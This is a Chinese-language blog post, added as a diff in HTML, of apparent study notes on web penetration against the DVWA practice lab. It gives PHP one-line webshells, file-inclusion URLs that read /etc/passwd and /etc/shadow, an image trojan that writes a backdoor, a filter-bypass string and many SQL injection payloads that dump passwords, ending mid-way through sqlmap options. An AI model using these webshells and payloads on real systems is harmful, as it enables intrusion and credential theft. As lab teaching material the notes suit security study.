@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="小灰灰"><meta name="renderer" content="webkit"><meta name="copyright" content="小灰灰"><meta name="keywords" content="小灰灰"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>hw · xhh's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/people1.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/people.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">xiaohuihui</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//www.cnblogs.com/lc-snail/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">xhh's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">hw</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-03-07 19:42:56</span></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">4.8k</span> | Reading time: <span class="post-count">20</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>dhclient    -r    eth0            //释放网卡0的ip</p>
+<p>dhclient    -v     eth0        //获取ip</p>
+<p>获取ip的四个步骤：</p>
+<p>1.DHCPDISCOVER</p>
+<p>2.DHCPOFFER</p>
+<p>3.DHCPREQUEST</p>
+<p>4.DHCPACK </p>
+<p><img src="/images/hw/image-20210311170427469.png" alt="image-20210311170427469"></p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ol>
+<li><p>文件上传(File Upload)是大部分Web应用都具备的功能，例如 用户上传附件、修改头像、分享图片/视频等</p>
+</li>
+<li><p>正常的文件一般是文档、图片、视频等，Web应用搜集之后放入后台存储，需要的时候再调出来返回</p>
+</li>
+<li><p>如果恶意文件如PHP、ASP等执行文件绕过Web应用，并顺利执行，则相当于黑客直接拿到了WebShell</p>
+</li>
+</ol>
+<h3 id="HW"><a href="#HW" class="headerlink" title="HW"></a>HW</h3><p><img src="/images/hw/image-20210311193434408.png" alt="image-20210311193434408"></p>
+<p>Nussus 、Nmap 、Burpsuite、Sqlmap</p>
+<p>Brupsuite</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'coderYang'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/hw/image-20210311211058605.png" alt="image-20210311211058605"></p>
+<p><img src="/images/hw/image-20210311200523901.png" alt="image-20210311200523901"></p>
+<h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p>小马：一句话木马也称为小马，即整个shell代码量只有一行，一般是系统执行函数</p>
+<p>大马：代码量和功能比小马多，一般会进行二次编码加密，防止被安全防火墙/入侵系统检测到</p>
+<p><code>shell2.php</code>    #eval    使用php函数，例如phpinfo()；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">http:<span class="comment">//10.3.137.171/dvwa/hackable/uploads/shell2.php?cmd=phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><code>shell3.php</code>    #system    使用linux系统命令，例如ls，cp，rm</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_REQUEST[<span class="string">'coderYang'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">http:<span class="comment">//10.3.137.171/dvwa/hackable/uploads/shell3.php?coderYang=cat /etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>中国菜刀：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'coderYang'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">说明：REQUEST是在网页端输入变量访问，POST则是使用像菜刀的工具连接，是C/S架构。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞：即<span class="selector-tag">File</span> <span class="selector-tag">Inclusion</span>，意思是文件包含(漏洞)，是指档期服务器开启<span class="selector-tag">allow_url_include</span>选项时，就可以通过<span class="selector-tag">php</span>的某些特征函数(include()，require()和include_once()，require_once())利用<span class="selector-tag">url</span>去动态的包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了<span class="selector-tag">php</span>配置中的<span class="selector-tag">allow_url_fopen</span>选项(选项开启之后，服务器允许包含一个远程的文件)。服务器通过<span class="selector-tag">php</span>的特性(函数)去包含任意文件时,由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">1</span>.文件包含(File Inclusion)即程序通过<span class="selector-attr">[包含函数]</span>调用本地或远程文件，以此来实现拓展功能</span><br><span class="line"><span class="selector-tag">2</span>.被包含的文件可以是各种文件格式，而当文件里包含恶意代码，则会形成远程命令执行或文件上传漏洞</span><br><span class="line"><span class="selector-tag">3</span>.文件包含漏洞主要发生在有包含语句的环境中，例如<span class="selector-tag">PHP</span>具备<span class="selector-tag">include</span>、<span class="selector-tag">require</span>等包含函数</span><br><span class="line"></span><br><span class="line">文件包含分为两大类：</span><br><span class="line">本地文件包含<span class="selector-tag">LFI</span>(Local File Inclusion)当被包含的文件在服务器本地时，就形成本地文件包含</span><br><span class="line">远程文件包含<span class="selector-tag">RFI</span>(Remote File Inclusion)当被包含的文件在第三方服务器时,又叫做远程文件包含</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本地文件包含</span><br><span class="line">访问本地系统账号信息及其它敏感信息</span><br><span class="line">http:<span class="comment">//192.168.106.134/dvwa/vulnerabilities/fi/?page=/etc/passwd</span></span><br><span class="line">http:<span class="comment">//192.168.106.134/dvwa/vulnerabilities/fi/?page=/etc/shadow</span></span><br><span class="line">http:<span class="comment">//192.168.106.134/dvwa/vulnerabilities/fi/?page=/etc/php5/apache2/php.ini</span></span><br><span class="line">http:<span class="comment">//192.168.106.134/dvwa/vulnerabilities/fi/?page=/etc/mysql/my.cnf</span></span><br><span class="line">http:<span class="comment">//192.168.106.134/dvwa/vulnerabilities/fi/?page=/etc/apache2/apache2.conf</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p><img src="../images/hw/image-20210312223410142.png" alt="image-20210312223410142"></p>
+<p><img src="../images/hw/image-20210312223830745.png" alt="image-20210312223830745"></p>
+<h4 id="低安全级别渗透"><a href="#低安全级别渗透" class="headerlink" title="低安全级别渗透"></a>低安全级别渗透</h4><h5 id="本地文件包含-webshell"><a href="#本地文件包含-webshell" class="headerlink" title="本地文件包含+webshell"></a>本地文件包含+webshell</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>制作一句话图片木马 coderYang.jpg</span><br><span class="line"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">"shell2.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php eval($_POST[coderYang]);?&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>上传图片木马文件</span><br><span class="line"><span class="number">3.</span>执行文件包含并生成后门</span><br><span class="line"><span class="number">4.</span>通过菜刀连接webshell</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">/<span class="keyword">var</span>/www/dvwa/hackable/uploads		<span class="comment">//dvawa文件上传访问的目录 coderYang.jpg</span></span><br><span class="line">/<span class="keyword">var</span>/www/dvwa/vulnerabilities/fi	<span class="comment">//dvwa文件包含访问的目录 shell2.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="远程文件包含-webshell"><a href="#远程文件包含-webshell" class="headerlink" title="远程文件包含+webshell"></a>远程文件包含+webshell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line"></span><br><span class="line">vim /var/www/html/coderYang.txt</span><br><span class="line">&lt;?fputs(fopen("shell50.php","w"),'&lt;?php eval($_POST[coderYang]);?&gt;')?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="中安全级别渗透"><a href="#中安全级别渗透" class="headerlink" title="中安全级别渗透"></a>中安全级别渗透</h4><p>但我们换成中安全级别渗透之后，我们可以发现”http://“和”https://“字符串被过滤了，所以对远程文件包含有限制，而对于本地文件包含没有什么问题。</p>
+<p><img src="/images/hw/image-20210314135502830.png" alt="image-20210314135502830"></p>
+<h5 id="本地文件包含-webshell-1"><a href="#本地文件包含-webshell-1" class="headerlink" title="本地文件包含+webshell"></a>本地文件包含+webshell</h5><p>无影响</p>
+<h5 id="远程文件包含-webshell-1"><a href="#远程文件包含-webshell-1" class="headerlink" title="远程文件包含+webshell"></a>远程文件包含+webshell</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们在url地址中输入:http:<span class="comment">//192.168.53.80/dvwa/vulnerabilities/fi/?page=httphttp://://192.168.53.78/coderYang02.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>即可绕或字符串的过滤</p>
+<h4 id="高安全级别渗透"><a href="#高安全级别渗透" class="headerlink" title="高安全级别渗透"></a>高安全级别渗透</h4><p><img src="/images/hw/image-20210314141331620.png" alt="image-20210314141331620"></p>
+<p>我们从源代码可以分析，代码这样写是不会有漏洞的，但是一般的代码也不会这样写，扩展性不高，直接写死，不便于后期维护</p>
+<h3 id="SQL注入攻击及防御"><a href="#SQL注入攻击及防御" class="headerlink" title="SQL注入攻击及防御"></a>SQL注入攻击及防御</h3><h4 id="查看表记录"><a href="#查看表记录" class="headerlink" title="查看表记录"></a>查看表记录</h4><p><img src="/images/hw/image-20210314152824938.png" alt="image-20210314152824938"></p>
+<p><img src="/images/hw/image-20210314152842204.png" alt="image-20210314152842204"></p>
+<p><img src="/images/hw/image-20210314152923094.png" alt="image-20210314152923094"></p>
+<p><img src="/images/hw/image-20210314152956613.png" alt="image-20210314152956613"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">select * from dvwa.users</span><br><span class="line">union</span><br><span class="line">select user_login,user_pass from wordpress.wp_users;</span><br><span class="line"></span><br><span class="line">如果用union查询的话，就会报错have a different number of colums</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">因为两个语句查的字段数都不一样</span><br><span class="line"></span><br><span class="line">方法：猜数字</span><br><span class="line">select * from dvwa.users union select 1;</span><br><span class="line">select * from dvwa.users union select 1,2;</span><br><span class="line">select * from dvwa.users union select 1,2,3;</span><br><span class="line">select * from dvwa.users union select 1,2,3,4;</span><br><span class="line">select * from dvwa.users union select 1,2,3,4,5;</span><br><span class="line">select * from dvwa.users union select 1,2,3,4,5,6;</span><br><span class="line"></span><br><span class="line">select * from dvwa.users union select user_login,user_pass,1,2,3,4 from wordpress.wp_users;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>information_schema数据库字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">==查询数据库库名、表名 information_schame.tables==</span><br><span class="line">select * from information_schema.TABLES;</span><br><span class="line"></span><br><span class="line">select DISTINCT table_schema from information_schema.tables;</span><br><span class="line"></span><br><span class="line">select table_schema,table_name from information_schema.tables;</span><br><span class="line"></span><br><span class="line">select table_schema,group_concat(table_name) from information_schema.tables group by table_schema;</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema = &apos;dvwa&apos;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">==查询数据库库名、表名、字段名 information.columns==</span><br><span class="line">select * from information_schema.columns;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_schema = &apos;dvwa&apos; and table_name = &apos;users&apos;;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name = &apos;user_privileges&apos;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name = &apos;schema_privileges&apos;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>SQL注入流程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.判断是否有SQL注入漏洞;</span><br><span class="line">2.判断操作系统、数据库和web应用的类型;</span><br><span class="line">3.获取数据库信息,包括管理员信息及拖库;</span><br><span class="line">4.加密信息破解,sqlmap可自动破解;</span><br><span class="line">5.提升权限，获得sql-shell、os-shell、登录应用后台</span><br></pre></td></tr></table></figure>
+
+
+
+<p>1.基于错误的注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误注入的思路是通过构造特殊的sql语句，根据得到的错误信息，确认sql注入点；通过数据库报错信息，也可以探测到数据库的类型和其他有用信息。</span><br><span class="line">通过输入单引号，触发数据库异常，通过异常日志诊断数据库类型。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/hw/image-20210314165708098.png" alt="image-20210314165708098"></p>
+<h4 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h4><h5 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h5><p>输入一个单引号即可。</p>
+<h5 id="基于布尔的注入"><a href="#基于布尔的注入" class="headerlink" title="基于布尔的注入"></a>基于布尔的注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">原始语句:select first_name,last_name from dvwa.users where user_id = &apos;&apos;</span><br><span class="line"></span><br><span class="line">SQL注入语句解析:	&apos; or 1=1 -- coderYang</span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos; &apos; or 1=1 -- coderYang</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">第一个&apos; 用于闭合前面的条件</span><br><span class="line">or 1=1 为true的条件</span><br><span class="line">-- 注释后面的语句</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="基于UNION注入"><a href="#基于UNION注入" class="headerlink" title="基于UNION注入"></a>基于UNION注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">UNION语句用于联合前面的SELECT查询语句，合并查询更多信息；</span><br><span class="line"></span><br><span class="line">一般通过错误和布尔注入确认注入点之后，便开始通过union语句来获取有效信息。</span><br><span class="line"></span><br><span class="line">//猜测数据列数</span><br><span class="line">&apos; union select 1 -- &apos;</span><br><span class="line">&apos; union select 1,2 -- &apos;</span><br><span class="line">&apos; union select 1,2,3 -- &apos;</span><br><span class="line">&apos; union select 1,2,3,4 -- &apos;</span><br><span class="line"></span><br><span class="line">SQL注入语句解析</span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos;&apos; union select 1 -- &apos;&apos;;</span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos;&apos; union select 1,2 -- &apos;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取当前数据库及用户信息</span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos;&apos; union select user(),database() -- &apos;&apos;;</span><br><span class="line"></span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos;&apos; union select version(),database() -- &apos;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">说明:</span><br><span class="line">version()	获取当前数据库版本信息</span><br><span class="line">database()	获取当前数据库名</span><br><span class="line">user()		获取当前用户名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//查询数据库中的所有表</span><br><span class="line">information_schema是数据库自带的，它提供了访问数据库元数据的方式；</span><br><span class="line">元数据包括数据库名、表名、列数据类型、访问权限、字符集等基础信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//查询所有库名</span><br><span class="line">&apos;union select table_schema,1 from information_schema.tables -- &apos;</span><br><span class="line"></span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos;&apos; union select table_schema,1 from information_schema.tables --&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//查看库中所有表名</span><br><span class="line">&apos;union select table_name,1 from information_schema.tables -- &apos;</span><br><span class="line"></span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos;&apos;union select table_name,1 from information_schema.tables -- &apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//同时查询表名以及对应库名</span><br><span class="line">&apos;union select table_schema,table_name from information_schema.tables -- &apos;</span><br><span class="line"></span><br><span class="line">select frist_name,last_name from dvwa.users where user_id = &apos;&apos; union select table_schema,table_name from information_schema.tables -- &apos;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//原始语句</span><br><span class="line">select first_name,last_name from dvwa.users where user_id = &apos;$id&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//查询表数据</span><br><span class="line">&apos; union select table_schema,column_name from information_schema.columns where table_name = &apos;users&apos; -- &apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//1只是用来占位的</span><br><span class="line">&apos;union select 1,column_name from information_schema.columns where table_name = &apos;user_privileges&apos; -- &apos;</span><br><span class="line"></span><br><span class="line">&apos; union select 1,column_name from information_schema.columns where table_name = &apos;schema_privileges&apos; -- &apos;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> SQL注入语句解析:</span><br><span class="line"> select first_name,last_name from dvwa.users where user_id = &apos;&apos; union select table_schema,column_name from information_schema.columns where table_name = &apos;users&apos; -- &apos;</span><br><span class="line"> </span><br><span class="line">  select first_name,last_name from dvwa.users where user_id = &apos;&apos;union select 1,column_name from information_schema.columns where table_name = &apos;user_privileges&apos; -- &apos;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">   select first_name,last_name from dvwa.users where user_id = &apos;&apos; union select 1,column_name from information_schema.columns where table_name = &apos;schema_privileges&apos; -- &apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//查询列数据</span><br><span class="line">&apos; union select NULL,user from users -- &apos;</span><br><span class="line"></span><br><span class="line">&apos; union select NULL,password from users -- &apos;</span><br><span class="line"></span><br><span class="line">&apos; union select user,password from users -- &apos;</span><br><span class="line"></span><br><span class="line">&apos; union select password,concat(first_name,&apos; &apos;,last_name,&apos; &apos;,user) from users -- &apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SQL语句解析:</span><br><span class="line"></span><br><span class="line">select first_name,last_name from dvwa.uesrs where user_id = &apos;&apos; union union select password,concat(first_name,&apos; &apos;,last_name,&apos; &apos;,user) from users -- &apos;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h5 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and sleep(5) -- &apos;</span><br><span class="line"></span><br><span class="line">SQL注入语句解析:</span><br><span class="line">select frist_name,last_name from dvwa.users where user_id = &apos;1&apos; and sleep(5) -- &apos;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们发现网页一直在加载中，说明我们加入的这条语句是可以执行的</p>
+<h5 id="sqlmap自动化注入"><a href="#sqlmap自动化注入" class="headerlink" title="sqlmap自动化注入"></a>sqlmap自动化注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sqlmap参数解析:</span><br><span class="line">--users</span><br><span class="line">--current-user</span><br><span class="line">--dbs</span><br><span class="line">--current-db</span><br><span class="line">-D &quot;database_name&quot; -- tables</span><br><span class="line">-D &quot;database_name&quot; -T &quot;table_name&quot; --columns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--dump  下载</span><br><span class="line">--dump-all		</span><br><span class="line">--dump-all --execlude-sysdbs</span><br><span class="line">-D &quot;database_name&quot; -T &quot;table_name&quot; --dump</span><br><span class="line">-D &quot;database_name&quot; -T &quot;table_name&quot; -C &quot;username,password&quot; 